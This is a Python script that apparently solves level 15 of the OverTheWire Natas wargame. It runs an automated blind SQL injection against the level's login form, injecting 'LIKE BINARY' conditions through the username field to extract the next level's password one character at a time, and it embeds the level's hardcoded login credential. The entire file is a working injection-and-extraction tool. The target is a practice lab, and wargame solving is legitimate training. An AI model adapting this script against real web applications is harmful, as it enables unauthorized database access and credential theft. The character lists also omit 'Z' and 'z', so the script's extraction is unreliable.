import requests
import grequests
import asyncio

chars = [chr(c) for c in range(ord('A'), ord('Z'))] + [chr(c) for c in range(ord('a'), ord('z'))] + [str(i) for i in range(0, 10)]
# print(chars)


def query_web(query):
    data = {'username': query}
    res = requests.post('http://natas15.natas.labs.overthewire.org/index.php', data=data, auth=('natas15', r'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'))
    if "doesn't" not in res.text:
        return True
    return False


async def query_web_async(querys):
    datas = [{'username': query} for query in querys]
    reqs = [grequests.post('http://natas15.natas.labs.overthewire.org/index.php', data=data, auth=('natas15', r'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')) for data in datas]
    ress = grequests.map(reqs)
    ret = []
    for res in ress:
        if "doesn't" not in res.text:
            ret.append(True)
        else:
            ret.append(False)
    return ret


def find_existent_chars():
    existent_chars = []
    for char in chars:
        res = query_web(f'natas16" and password LIKE BINARY "%{char}%" #')
        if res:
            print(str(char), end=', ', flush=True)
            existent_chars.append(char)
    print()
    return existent_chars


async def find_existent_chars_async():
    res = await query_web_async([(f'natas16" and password LIKE BINARY "%{char}%" #') for char in chars])
    existent_chars = [char for char in chars if res[chars.index(char)]]
    return existent_chars


def find_password(existent_chars):
    password = []
    password_len = -1
    while len(password) > password_len:
        password_len += 1
        for char in existent_chars:
            res = query_web('natas16" and password LIKE BINARY "{}%" #'.format(''.join(password) + str(char)))
            if res:
                print(str(char), end='', flush=True)
                password.append(char)
                break
    print()
    return password


async def find_password_async(existent_chars):
    password = []
    password_len = -1
    while len(password) > password_len:
        password_len += 1
        res = await query_web_async(['natas16" and password LIKE BINARY "{}%" #'.format(''.join(password) + str(char)) for char in existent_chars])
        next_chars = [char for char in existent_chars if res[existent_chars.index(char)]]
        for char in next_chars:
            password.append(char)
            print(char, end='', flush=True)
    print()
    return password


async def main():
    print('existent chars: ')
    ec = await find_existent_chars_async()
    print(ec)
    print('password: ')
    await find_password_async(ec)

if __name__ == '__main__':
    asyncio.run(main())
    # ec = find_existent_chars()
    # print('password: ')
    # find_password(ec)
